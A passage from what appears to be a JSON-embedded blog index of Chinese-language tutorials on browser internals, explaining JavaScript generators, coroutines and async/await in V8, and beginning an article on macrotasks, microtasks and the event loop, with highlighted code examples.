class=\"line\"><span class=\"keyword\">const</span> gen = <span class=\"title function_\">genDemo</span>();</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'main 0'</span>)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(gen.<span class=\"title function_\">next</span>().<span class=\"property\">value</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'main 1'</span>)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(gen.<span class=\"title function_\">next</span>().<span class=\"property\">value</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'main 2'</span>)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(gen.<span class=\"title function_\">next</span>().<span class=\"property\">value</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'main 3'</span>)</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(gen.<span class=\"title function_\">next</span>().<span class=\"property\">value</span>);</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'main 4'</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>执行上面这段代码，观察输出结果，你会发现函数 genDemo 并不是一次执行完的，全局代码和 genDemo 函数交替执行。其实这就是生成器函数的特性，可以暂停执行，也可以恢复执行。下面我们就来看看生成器函数的具体使用方式：</p>\n<ol>\n<li>在生成器函数内部执行一段代码，如果遇到 yield 关键字，那么 JavaScript 引擎将返回关键字后面的内容给外部，并暂停该函数的执行。</li>\n<li>外部函数可以通过 next 方法恢复函数的执行。</li>\n</ol>\n<p>关于函数的暂停和恢复，相信你一定很好奇这其中的原理，那么接下来我们就来简单介绍下 JavaScript 引擎 V8 是如何实现一个函数的暂停和恢复的，这也会有助于你理解后面要介绍的 <code>async/await</code>。</p>\n<p>要搞懂函数为何能暂停和恢复，那你首先要了解协程的概念。<strong>协程是一种比线程更加轻量级的存在</strong>。你可以把协程看成是跑在线程上的任务，一个线程上可以存在多个协程，但是在线程上同时只能执行一个协程，比如当前执行的是 A 协程，要启动 B 协程，那么 A 协程就需要将主线程的控制权交给 B 协程，这就体现在 A 协程暂停执行，B 协程恢复执行；同样，也可以从 B 协程中启动 A 协程。通常，<strong>如果从 A 协程启动 B 协程，我们就把 A 协程称为 B 协程的父协程</strong>。</p>\n<p>正如一个进程可以拥有多个线程一样，一个线程也可以拥有多个协程。最重要的是，协程不是被操作系统内核所管理，而完全是由程序所控制（也就是在用户态执行）。这样带来的好处就是性能得到了很大的提升，不会像线程切换那样消耗资源。</p>\n<p>为了让你更好地理解协程是怎么执行的，我结合上面那段代码的执行过程，画出了下面的 “协程执行流程图”，你可以对照着代码来分析：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663c6a6c0ea9cb1403187b39.png\" alt=\"协程执行流程图\"></p>\n<p>从图中可以看出来协程的四点规则：</p>\n<ol>\n<li>通过调用生成器函数 genDemo 来创建一个协程 gen，创建之后，gen 协程并没有立即执行。</li>\n<li>要让 gen 协程执行，需要通过调用 <code>gen.next</code>。</li>\n<li>当协程正在执行的时候，可以通过 yield 关键字来暂停 gen 协程的执行，并返回主要信息给父协程。</li>\n<li>如果协程在执行期间，遇到了 <code>return</code> 关键字，那么 JavaScript 引擎会结束当前协程，并将 <code>return</code> 后面的内容返回给父协程。</li>\n</ol>\n<p>不过，对于上面这段代码，你可能又有这样疑问：父协程有自己的调用栈，gen 协程时也有自己的调用栈，当 gen 协程通过 yield 把控制权交给父协程时，V8 是如何切换到父协程的调用栈？当父协程通过 <code>gen.next</code> 恢复 gen 协程时，又是如何切换 gen 协程的调用栈？</p>\n<p>要搞清楚上面的问题，你需要关注以下两点内容。</p>\n<p>第一点：gen 协程和父协程是在主线程上交互执行的，并不是并发执行的，它们之前的切换是通过 yield 和 gen.next 来配合完成的。</p>\n<p>第二点：当在 gen 协程中调用了 yield 方法时，JavaScript 引擎会保存 gen 协程当前的调用栈信息，并恢复父协程的调用栈信息。同样，当在父协程中执行 gen.next 时，JavaScript 引擎会保存父协程的调用栈信息，并恢复 gen 协程的调用栈信息。</p>\n<p>为了直观理解父协程和 gen 协程是如何切换调用栈的，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663c6aed0ea9cb1403193f0f.png\" alt=\"gen协程和父协程之间的切换\"></p>\n<p>到这里相信你已经弄清楚了协程是怎么工作的，其实在 JavaScript 中，生成器就是协程的一种实现方式，这样相信你也就理解什么是生成器了。那么接下来，我们使用生成器和 Promise 来改造开头的那段 Promise 代码。改造后的代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//foo函数</span></span><br><span class=\"line\"><span class=\"keyword\">function</span>* <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> response1 = <span class=\"keyword\">yield</span> <span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response1'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response1)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> response2 = <span class=\"keyword\">yield</span> <span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org/test'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response2'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response2)</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//执行foo函数的代码</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> gen = <span class=\"title function_\">foo</span>()</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">getGenPromise</span>(<span class=\"params\">gen</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> gen.<span class=\"title function_\">next</span>().<span class=\"property\">value</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">getGenPromise</span>(gen).<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">getGenPromise</span>(gen)</span><br><span class=\"line\">}).<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">response</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response3'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n\n<p>从图中可以看到，foo 函数是一个生成器函数，在 foo 函数里面实现了用同步代码形式来实现异步操作；但是在 foo 函数外部，我们还需要写一段执行 foo 函数的代码，如上述代码的后半部分所示，那下面我们就来分析下这段代码是如何工作的。</p>\n<ul>\n<li>首先执行的是 <code>let gen = foo()</code>，创建了 gen 协程。</li>\n<li>然后在父协程中通过执行 gen.next 把主线程的控制权交给 gen 协程。</li>\n<li>gen 协程获取到主线程的控制权后，就调用 fetch 函数创建了一个 Promise 对象 response1，然后通过 yield 暂停 gen 协程的执行，并将 response1 返回给父协程。</li>\n<li>父协程恢复执行后，调用 <code>response1.then</code> 方法等待请求结果。</li>\n<li>等通过 fetch 发起的请求完成之后，会调用 then 中的回调函数，then 中的回调函数拿到结果之后，通过调用 gen.next 放弃主线程的控制权，将控制权交 gen 协程继续执行下个请求。<br>以上就是协程和 Promise 相互配合执行的一个大致流程。不过通常，我们把执行生成器的代码封装成一个函数，并把这个执行生成器代码的函数称为<strong>执行器</strong>（可参考著名的 co 框架），如下面这种方式：</li>\n</ul>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span>* <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> response1 = <span class=\"keyword\">yield</span> <span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response1'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response1)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> response2 = <span class=\"keyword\">yield</span> <span class=\"title function_\">fetch</span>(<span class=\"string\">'https://www.geekbang.org/test'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'response2'</span>)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response2)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">co</span>(<span class=\"title function_\">foo</span>());</span><br></pre></td></tr></tbody></table></figure>\n\n<p>通过使用生成器配合执行器，就能实现使用同步的方式写出异步代码了，这样也大大加强了代码的可读性。</p>\n<h2 id=\"async-await\"><a href=\"#async-await\" class=\"headerlink\" title=\"async/await\"></a>async/await</h2><p>虽然生成器已经能很好地满足我们的需求了，但是程序员的追求是无止境的，这不又在 ES7 中引入了 <code>async/await</code>，这种方式能够彻底告别执行器和生成器，实现更加直观简洁的代码。其实 <code>async/await</code> 技术背后的秘密就是 Promise 和生成器应用，往低层说就是微任务和协程应用。要搞清楚 async 和 await 的工作原理，我们就得对 async 和 await 分开分析。</p>\n<h3 id=\"1-async\"><a href=\"#1-async\" class=\"headerlink\" title=\"1. async\"></a>1. async</h3><p>我们先来看看 async 到底是什么？根据 MDN 定义，async 是一个通过异步执行并隐式返回 Promise 作为结果的函数。</p>\n<p>对 async 函数的理解，这里需要重点关注两个词：<strong>异步执行</strong>和<strong>隐式返回 Promise</strong>。</p>\n<p>关于异步执行的原因，我们一会儿再分析。这里我们先来看看是如何隐式返回 Promise 的，你可以参考下面的代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">2</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title function_\">foo</span>())  <span class=\"comment\">// Promise {&lt;resolved&gt;: 2}</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>执行这段代码，我们可以看到调用 async 声明的 foo 函数返回了一个 Promise 对象，状态是 resolved，返回结果如下所示：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">Promise {&lt;resolved&gt;: 2}</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"2-await\"><a href=\"#2-await\" class=\"headerlink\" title=\"2. await\"></a>2. await</h3><p>我们知道了 async 函数返回的是一个 Promise 对象，那下面我们再结合文中这段代码来看看 await 到底是什么。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">1</span>)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> a = <span class=\"keyword\">await</span> <span class=\"number\">100</span></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(a)</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">2</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">3</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>观察上面这段代码，你能判断出打印出来的内容是什么吗？这得先来分析 async 结合 await 到底会发生什么。在详细介绍之前，我们先站在协程的视角来看看这段代码的整体执行流程图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663c6d490ea9cb14031ca960.png\" alt=\"async/await执行流程图\"></p>\n<p>结合上图，我们来一起分析下 async/await 的执行流程。</p>\n<p>首先，执行 <code>console.log(0)</code> 这个语句，打印出来 0。</p>\n<p>紧接着就是执行 foo 函数，由于 foo 函数是被 async 标记过的，所以当进入该函数的时候，JavaScript 引擎会保存当前的调用栈等信息，然后执行 foo 函数中的 <code>console.log(1)</code> 语句，并打印出 1。</p>\n<p>接下来就执行到 foo 函数中的 <code>await 100</code> 这个语句了，这里是我们分析的重点，因为在执行 <code>await 100</code> 这个语句时，JavaScript 引擎在背后为我们默默做了太多的事情，那么下面我们就把这个语句拆开，来看看 JavaScript 到底都做了哪些事情。</p>\n<p>当执行到 <code>await 100</code> 时，会默认创建一个 Promise 对象，代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> promise_ = <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>((resolve,reject){</span><br><span class=\"line\">  <span class=\"title function_\">resolve</span>(<span class=\"number\">100</span>)</span><br><span class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在这个 <code>promise_</code>对象创建的过程中，我们可以看到在 executor 函数中调用了 resolve 函数，JavaScript 引擎会将该任务提交给微任务队列（<a href=\"/browser/pageEventLoop/PromiseXFetch.html\">上一篇文章</a>中我们讲解过）。</p>\n<p>然后 JavaScript 引擎会暂停当前协程的执行，将主线程的控制权转交给父协程执行，同时会将 promise_对象返回给父协程。</p>\n<p>主线程的控制权已经交给父协程了，这时候父协程要做的一件事是调用 promise_.then 来监控 promise 状态的改变。</p>\n<p>接下来继续执行父协程的流程，这里我们执行 <code>console.log(3)</code>，并打印出来 3。随后父协程将执行结束，在结束之前，会进入微任务的检查点，然后执行微任务队列，微任务队列中有 <code>resolve(100)</code> 的任务等待执行，执行到这里的时候，会触发 promise_.then 中的回调函数，如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">promise_.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">value</span>)=&gt;</span>{</span><br><span class=\"line\">   <span class=\"comment\">//回调函数被激活后</span></span><br><span class=\"line\">  <span class=\"comment\">//将主线程控制权交给foo协程，并将vaule值传给协程</span></span><br><span class=\"line\">})</span><br></pre></td></tr></tbody></table></figure>\n\n<p>该回调函数被激活以后，会将主线程的控制权交给 foo 函数的协程，并同时将 value 值传给该协程。</p>\n<p>foo 协程激活之后，会把刚才的 value 值赋给了变量 a，然后 foo 协程继续执行后续语句，执行完成之后，将控制权归还给父协程。</p>\n<p>以上就是 await/async 的执行流程。正是因为 async 和 await 在背后为我们做了大量的工作，所以我们才能用同步的方式写出异步代码来。</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>好了，今天就介绍到这里，下面我来总结下今天的主要内容。</p>\n<p>Promise 的编程模型依然充斥着大量的 then 方法，虽然解决了回调地狱的问题，但是在语义方面依然存在缺陷，代码中充斥着大量的 then 函数，这就是 <code>async/await</code> 出现的原因。</p>\n<p>使用 <code>async/await</code> 可以实现用同步代码的风格来编写异步代码，这是因为 <code>async/await</code> 的基础技术使用了生成器和 Promise，生成器是协程的实现，利用生成器能实现生成器函数的暂停和恢复。</p>\n<p>另外，V8 引擎还为 <code>async/await</code> 做了大量的语法层面包装，所以了解隐藏在背后的代码有助于加深你对 <code>async/await</code> 的理解。</p>\n<p><code>async/await</code> 无疑是异步编程领域非常大的一个革新，也是未来的一个主流的编程风格。其实，除了 JavaScript，Python、Dart、C# 等语言也都引入了 <code>async/await</code>，使用它不仅能让代码更加整洁美观，而且还能确保该函数始终都能返回 Promise。</p>\n<h2 id=\"课外作业\"><a href=\"#课外作业\" class=\"headerlink\" title=\"课外作业\"></a>课外作业</h2><p>下面这段代码整合了定时器、Promise 和 async/await，你能分析出来这段代码执行后输出的内容吗？</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'foo'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">bar</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'bar start'</span>)</span><br><span class=\"line\">    <span class=\"keyword\">await</span> <span class=\"title function_\">foo</span>()</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'bar end'</span>)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'script start'</span>)</span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'setTimeout'</span>)</span><br><span class=\"line\">}, <span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"title function_\">bar</span>();</span><br><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"keyword\">function</span> (<span class=\"params\">resolve</span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'promise executor'</span>)</span><br><span class=\"line\">    <span class=\"title function_\">resolve</span>();</span><br><span class=\"line\">}).<span class=\"title function_\">then</span>(<span class=\"keyword\">function</span> (<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'promise then'</span>)</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'script end'</span>)</span><br></pre></td></tr></tbody></table></figure>\n"},{"title":"宏任务和微任务：不是所有任务都是一个待遇","url":"/browser/pageEventLoop/MacroAndMicroTasks.html","content":"<p>在前面几篇文章中，我们介绍了消息队列，并结合消息队列介绍了两种典型的 WebAPI——<strong>setTimeout</strong> 和 <strong>XMLHttpRequest</strong>，通过这两个 WebAPI 我们搞清楚了浏览器的消息循环系统是怎么工作的。不过随着浏览器的应用领域越来越广泛，消息队列中这种粗时间颗粒度的任务已经不能胜任部分领域的需求，所以又出现了一种新的技术 —— <strong>微任务。微任务可以在实时性和效率之间做一个有效的权衡</strong>。</p>\n<p>从目前的情况来看，微任务已经被广泛地应用，基于微任务的技术有 MutationObserver、Promise 以及以 Promise 为基础开发出来的很多其他的技术。所以微任务的重要性也与日俱增，了解其底层的工作原理对于你读懂别人的代码，以及写出更高效、更具现代的代码有着决定性的作用。</p>\n<p>有微任务，也就有宏任务，那这二者到底有什么区别？它们又是如何相互取长补短的？</p>\n<h2 id=\"宏任务\"><a href=\"#宏任务\" class=\"headerlink\" title=\"宏任务\"></a>宏任务</h2><p>前面我们已经介绍过了，页面中的大部分任务都是在主线程上执行的，这些任务包括了：</p>\n<ul>\n<li>渲染事件（如解析 DOM、计算布局、绘制）；</li>\n<li>用户交互事件（如鼠标点击、滚动页面、放大缩小等）；</li>\n<li>JavaScript 脚本执行事件；</li>\n<li>网络请求完成、文件读写完成事件。</li>\n</ul>\n<p>为了协调这些任务有条不紊地在主线程上执行，页面进程引入了消息队列和事件循环机制，渲染进程内部会维护多个消息队列，比如延迟执行队列和普通的消息队列。然后主线程采用一个 for 循环，不断地从这些任务队列中取出任务并执行任务。我们把这些消息队列中的任务称为<strong>宏任务</strong>。</p>\n<p>消息队列中的任务是通过事件循环系统来执行的，这里我们可以看看在<span class=\"exturl\" data-url=\"aHR0cHM6Ly9odG1sLnNwZWMud2hhdHdnLm9yZy9tdWx0aXBhZ2Uvd2ViYXBwYXBpcy5odG1sI2V2ZW50LWxvb3AtcHJvY2Vzc2luZy1tb2RlbA==\"> WHATWG 规范<i class=\"fa fa-external-link-alt\"></i></span>中是怎么定义事件循环机制的。</p>\n<p>由于规范需要支持语义上的完备性，所以通常写得都会比较啰嗦，这里我就大致总结了下 WHATWG 规范定义的大致流程：</p>\n<ul>\n<li>先从多个消息队列中选出一个最老的任务，这个任务称为 oldestTask；</li>\n<li>然后循环系统记录任务开始执行的时间，并把这个 oldestTask 设置为当前正在执行的任务；</li>\n<li>当任务执行完成之后，删除当前正在执行的任务，并从对应的消息队列中删除掉这个 oldestTask；</li>\n<li>最后统计执行完成的时长等信息。<br>以上就是消息队列中宏任务的执行过程，通过前面的学习，相信你也很熟悉这套执行流程了。</li>\n</ul>\n<p>宏任务可以满足我们大部分的日常需求，不过如果有对时间精度要求较高的需求，宏任务就难以胜任了，下面我们就来分析下为什么宏任务难以满足对时间精度要求较高的任务。</p>\n<p>前面我们说过，页面的渲染事件、各种 IO 的完成事件、执行 JavaScript 脚本的事件、用户交互的事件等都随时有可能被添加到消息队列中，而且添加事件是由系统操作的，JavaScript 代码不能准确掌控任务要添加到队列中的位置，控制不了任务在消息队列中的位置，所以很难控制开始执行任务的时间。为了直观理解，你可以看下面这段代码：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">'demo'</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\">                <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>test<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">ol</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/javascript\"</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">function</span> <span class=\"title function_\">timerCallback2</span>(<span class=\"params\"></span>){</span></span><br><span class=\"line\"><span class=\"language-javascript\">          <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">2</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">        }</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">function</span> <span class=\"title function_\">timerCallback</span>(<span class=\"params\"></span>){</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"built_in\">setTimeout</span>(timerCallback2,<span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">        }</span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"built_in\">setTimeout</span>(timerCallback,<span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p>在这段代码中，我的目的是想通过 setTimeout 来设置两个回调任务，并让它们按照前后顺序来执行，中间也不要再插入其他的任务，因为如果这两个任务的中间插入了其他的任务，就很有可能会影响到第二个定时器的执行时间了。</p>\n<p>但实际情况是我们不能控制的，比如在你调用 setTimeout 来设置回调任务的间隙，消息队列中就有可能被插入很多系统级的任务。你可以打开 Performance 工具，来记录下这段任务的执行过程，也可参考文中我记录的图片：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66389bf60ea9cb140371fd26.png\" alt=\"Performance记录\"></p>\n<p>setTimeout 函数触发的回调函数都是宏任务，如图中，左右两个黄色块就是 setTimeout 触发的两个定时器任务。</p>\n<p>现在你可以重点观察上图中间浅红色区域，这里有很多一段一段的任务，这些是被渲染引擎插在两个定时器任务中间的任务。试想一下，如果中间被插入的任务执行时间过久的话，那么就会影响到后面任务的执行了。</p>\n<p>所以说宏任务的时间粒度比较大，执行的时间间隔是不能精确控制的，对一些高实时性的需求就不太符合了，比如后面要介绍的监听 DOM 变化的需求。</p>\n<h2 id=\"微任务\"><a href=\"#微任务\" class=\"headerlink\" title=\"微任务\"></a>微任务</h2><p>在理解了宏任务之后，下面我们就可以来看看什么是微任务了。在上一篇文章中，我们介绍过异步回调的概念，其主要有两种方式。</p>\n<p><strong>第一种是把异步回调函数封装成一个宏任务，添加到消息队列尾部，当循环系统执行到该任务的时候执行回调函数</strong>。这种比较好理解，我们前面介绍的 setTimeout 和 XMLHttpRequest 的回调函数都是通过这种方式来实现的。</p>\n<p><strong>第二种方式的执行时机是在主函数执行结束之后、当前宏任务结束之前执行回调函数，这通常都是以微任务形式体现的</strong>。</p>\n<p>那这里说的微任务到底是什么呢？</p>\n<p><strong>微任务就是一个需要异步执行的函数，执行时机是在主函数执行结束之后、当前宏任务结束之前</strong>。</p>\n<p>不过要搞清楚微任务系统是怎么运转起来的，就得站在 V8 引擎的层面来分析下。</p>\n<p>我们知道当 JavaScript 执行一段脚本的时候，V8 会为其创建一个全局执行上下文，在创建全局执行上下文的同时，V8 引擎也会在内部创建一个<strong>微任务队列</strong>。顾名思义，这个微任务队列就是用来存放微任务的，因为在当前宏任务执行的过程中，有时候会产生多个微任务，这时候就需要使用这个微任务队列来保存这些微任务了。不过这个微任务队列是给 V8 引擎内部使用的，所以你是无法通过 JavaScript 直接访问的。</p>\n<p>也就是说每个宏任务都关联了一个微任务队列。那么接下来，我们就需要分析两个重要的时间点 —— 微任务产生的时机和执行微任务队列的时机。</p>\n<p>我们先来看看微任务是怎么产生的？在现代浏览器里面，产生微任务有两种方式。</p>\n<p>第一种方式是使用 MutationObserver 监控某个 DOM 节点，然后再通过 JavaScript 来修改这个节点，或者为这个节点添加、删除部分子节点，当 DOM 节点发生变化时，就会产生 DOM 变化记录的微任务。</p>\n<p>第二种方式是使用 Promise，当调用 Promise.resolve () 或者 Promise.reject () 的时候，也会产生微任务。</p>\n<p>通过 DOM 节点变化产生的微任务或者使用 Promise 产生的微任务都会被 JavaScript 引擎按照顺序保存到微任务队列中。</p>\n<p>好了，现在微任务队列中有了微任务了，那接下来就要看看微任务队列是何时被执行的。</p>\n<p>通常情况下，在当前宏任务中的 JavaScript 快执行完成时，也就在 JavaScript 引擎准备退出全局执行上下文并清空调用栈的时候，JavaScript 引擎会检查全局执行上下文中的微任务队列，然后按照顺序执行队列中的微任务。<strong>WHATWG 把执行微任务的时间点称为检查点</strong>。当然除了在退出全局执行上下文式这个检查点之外，还有其他的检查点，不过不是太重要，这里就不做介绍了。</p>\n<p>如果在执行微任务的过程中，产生了新的微任务，同样会将该微任务添加到微任务队列中，V8 引擎一直循环执行微任务队列中的任务，直到队列为空才算执行结束。也就是说在执行微任务过程中产生的新的微任务并不会推迟到下个宏任务中执行，而是在当前的宏任务中继续执行。</p>\n<p>为了直观地理解什么是微任务，你可以参考下面我画的示意图（由于内容比较多，我将其分为了两张）：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66389c730ea9cb140374f661.png\" alt=\"微任务添加和执行流程示意图\"></p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66389c8a0ea9cb1403752f7b.png\" alt=\"微任务添加和执行流程示意图\"></p>\n<p>该示意图是在执行一个 ParseHTML 的宏任务，在执行过程中，遇到了 JavaScript 脚本，那么就暂停解析流程，进入到 JavaScript 的执行环境。从图中可以看到，全局上下文中包含了微任务列表。</p>\n<p>在 JavaScript 脚本的后续执行过程中，分别通过 Promise 和 removeChild 创建了两个微任务，并被添加到微任务列表中。接着 JavaScript 执行结束，准备退出全局执行上下文，这时候就到了检查点了，JavaScript 